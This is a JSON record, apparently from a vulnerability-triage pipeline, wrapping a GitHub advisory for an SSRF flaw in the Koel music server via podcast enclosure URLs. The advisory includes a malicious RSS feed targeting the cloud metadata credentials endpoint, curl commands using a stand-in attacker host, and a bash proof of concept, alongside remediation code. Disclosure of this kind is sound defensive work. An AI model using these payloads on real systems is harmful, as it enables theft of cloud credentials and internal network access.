@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/110058202?v=4\", \"events_url\": \"https://api.github.com/users/EndlssNightmare/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/EndlssNightmare/followers\", \"following_url\": \"https://api.github.com/users/EndlssNightmare/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/EndlssNightmare/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/EndlssNightmare\", \"id\": 110058202, \"login\": \"EndlssNightmare\", \"node_id\": \"U_kgDOBo9a2g\", \"organizations_url\": \"https://api.github.com/users/EndlssNightmare/orgs\", \"received_events_url\": \"https://api.github.com/users/EndlssNightmare/received_events\", \"repos_url\": \"https://api.github.com/users/EndlssNightmare/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/EndlssNightmare/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/EndlssNightmare/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/EndlssNightmare\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-47260\", \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Summary\\n\\nKoel validates the podcast feed URL via the `SafeUrl` rule (DNS resolution + public IP check), but the individual episode `<enclosure url=\\\"...\\\">` values extracted from the RSS XML are stored directly into the database without any SSRF validation. When a user plays an episode, the server downloads the full HTTP response from the unvalidated enclosure URL via `Http::sink()->get()` and streams it back to the user, enabling full-read SSRF against internal services.\\n\\n---\\n\\n## Vulnerability Details\\n\\n### Episode URL Stored Without Validation\\n\\n**File:** `app/Services/Podcast/PodcastService.php`, line 146\\n\\n```php\\n'path' => $episodeValue->enclosure->url,  // Unvalidated URL from RSS XML\\n```\\n\\nThe `SafeUrl` rule is applied to the podcast feed URL at subscription time (`SubscribeToPodcastRequest`), but episode enclosure URLs parsed from the feed XML are stored as-is.\\n\\n### SSRF Trigger: Full Content Download\\n\\n**File:** `app/Values/Podcast/EpisodePlayable.php`, line 42\\n\\n```php\\nHttp::sink($file)->get($episode->path)->throw();\\n```\\n\\nWhen an episode is played, `PodcastStreamerAdapter::stream()` first attempts `getStreamableUrl()` (OPTIONS/HEAD requests to the episode URL). If no CORS header is present (which internal services won't have), it falls through to `EpisodePlayable::createForEpisode()`, which downloads the full response body and streams it back to the user.\\n\\n### SafeUrl Applied Only to Feed URL\\n\\n**File:** `app/Http/Requests/API/Podcast/SubscribeToPodcastRequest.php`\\n\\n```php\\npublic function rules(): array\\n{\\n    return ['url' => ['required', 'url:http,https', new SafeUrl]];\\n}\\n```\\n\\nThe `SafeUrl` rule (`app/Rules/SafeUrl.php`) validates scheme, DNS resolution to public IP, and effective URL after redirects. But this only protects the feed URL — not the content within the feed.\\n\\n---\\n\\n## Attack Flow\\n\\n1. Attacker registers an account (Community edition, no Plus required)\\n2. Attacker hosts a malicious RSS feed on a public server:\\n   ```xml\\n   <rss version=\\\"2.0\\\">\\n     <channel>\\n       <title>Legit Podcast</title>\\n       <item>\\n         <title>Episode 1</title>\\n         <enclosure url=\\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\"\\n                    type=\\\"audio/mpeg\\\" length=\\\"1000\\\"/>\\n         <guid>ssrf-1</guid>\\n       </item>\\n     </channel>\\n   </rss>\\n   ```\\n3. `POST /api/podcasts` with `url=https://evil.com/feed.xml` — passes `SafeUrl` (public URL)\\n4. Koel parses feed, stores episode with `path = http://169.254.169.254/...`\\n5. Attacker plays episode: `GET /play/{episode_id}`\\n6. Server executes `Http::sink($file)->get(\\\"http://169.254.169.254/...\\\")`\\n7. AWS metadata response downloaded to disk, streamed back to attacker\\n\\n---\\n\\n## Proof of Concept\\n\\n```bash\\n#!/bin/bash\\n# PoC: Koel SSRF via Podcast Episode Enclosure URL\\n# Step 1: Host malicious RSS feed (feed.xml) on attacker server\\n# Step 2: Subscribe to the podcast\\n\\nKOEL_URL=\\\"https://TARGET\\\"\\nAPI_TOKEN=\\\"<api_token>\\\"\\n\\n# Subscribe to malicious podcast\\ncurl -X POST \\\"$KOEL_URL/api/podcasts\\\" \\\\\\n  -H \\\"Authorization: Bearer $API_TOKEN\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"url\\\": \\\"https://attacker.com/feed.xml\\\"}'\\n\\n# List episodes to get the episode ID\\nEPISODE_ID=$(curl -s \\\"$KOEL_URL/api/podcasts\\\" \\\\\\n  -H \\\"Authorization: Bearer $API_TOKEN\\\" | jq -r '.[0].episodes[0].id')\\n\\n# Play the episode — triggers SSRF, returns internal service response\\ncurl \\\"$KOEL_URL/play/$EPISODE_ID?api_token=$API_TOKEN\\\" -o response.bin\\n\\ncat response.bin\\n# Expected: AWS metadata / internal service response\\n```\\n\\n---\\n\\n## Impact\\n\\n- **Cloud credential theft:** Read AWS/GCP/Azure metadata endpoints (IAM credentials, tokens)\\n- **Internal network reconnaissance:** Scan ports and enumerate internal HTTP services\\n- **Data exfiltration:** Read responses from internal APIs, admin panels, databases with HTTP interfaces\\n- **Full response body:** Unlike blind SSRF, the entire response is returned to the attacker\\n\\n---\\n\\n## Secondary Finding: SSRF Bypass via AI Radio Station Tool\\n\\n**File:** `app/Ai/Tools/AddRadioStation.php`, lines 35-38\\n\\nThe AI assistant's `AddRadioStation` tool creates radio stations by calling `RadioService::createRadioStation()` directly, bypassing the `SafeUrl` and `HasAudioContentType` validation rules that protect the REST API endpoint.\\n\\n**Impact:** Same SSRF but requires Plus license. CVSS 7.7 HIGH.\\n\\n---\\n\\n## Novelty Check\\n\\n- **No existing CVEs found for Koel** (searched NVD, GitHub Advisories, web)\\n- **No SECURITY.md** in the repository\\n- **This is a novel vulnerability**\\n\\n---\\n\\n## Remediation\\n\\n**Fix 1:** Validate episode enclosure URLs in `synchronizeEpisodes()`:\\n\\n```php\\nforeach ($episodeCollection as $episodeValue) {\\n    $enclosureUrl = $episodeValue->enclosure->url;\\n    $host = parse_url($enclosureUrl, PHP_URL_HOST);\\n    if (!$host || !Network::isPublicHost($host)) {\\n        continue; // Skip episodes with non-public URLs\\n    }\\n    // ... rest of episode creation\\n}\\n```\\n\\n**Fix 2:** Defense-in-depth validation at playback time in `EpisodePlayable::createForEpisode()`.\\n\\n**Fix 3:** Add `SafeUrl` validation in `AddRadioStation` AI tool.\", \"epss\": {\"percentage\": 0.00263, \"percentile\": 0.17568}, \"ghsa_id\": \"GHSA-7j2f-6h2r-6cqc\", \"github_reviewed_at\": \"2026-05-29T19:56:06Z\", \"html_url\": \"https://github.com/advisories/GHSA-7j2f-6h2r-6cqc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7j2f-6h2r-6cqc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-47260\"}], \"nvd_published_at\": \"2026-06-12T20:16:46Z\", \"published_at\": \"2026-05-29T19:56:06Z\", \"references\": [\"https://github.com/koel/koel/security/advisories/GHSA-7j2f-6h2r-6cqc\", \"https://github.com/koel/koel/commit/8708f077efd7d8a332b32e954d65bc837f3a413a\", \"https://github.com/koel/koel/commit/be1e867982dcadefd4a75d768ce950b1d5234cdf\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-47260\", \"https://github.com/advisories/GHSA-7j2f-6h2r-6cqc\"], \"repository_advisory_url\": \"https://api.github.com/repos/koel/koel/security-advisories/GHSA-7j2f-6h2r-6cqc\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/koel/koel\", \"summary\": \"Koel Vulnerable to SSRF via Podcast Episode Enclosure URLs\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-12T22:01:13Z\", \"url\": \"https://api.github.com/advisories/GHSA-7j2f-6h2r-6cqc\", \"vulnerabilities\": [{\"first_patched_version\": \"9.3.5\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phanan/koel\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 9.3.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7j2f-6h2r-6cqc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phanan/koel: <= 9.3.4"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-47260"
+    ],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phanan/koel"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.899839Z",
+  "provenance": {
+    "content_sha256": "6846d5f644cb403869b2a5e2a2dcea2d7820e9d4410fefc0bcf5ad29b840aa2b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-29T19:56:06Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7j2f-6h2r-6cqc",
+  "status": "active",
+  "title": "Koel Vulnerable to SSRF via Podcast Episode Enclosure URLs",
+  "updated_at": "2026-06-12T22:01:13Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7j2f-6h2r-6cqc"
+}
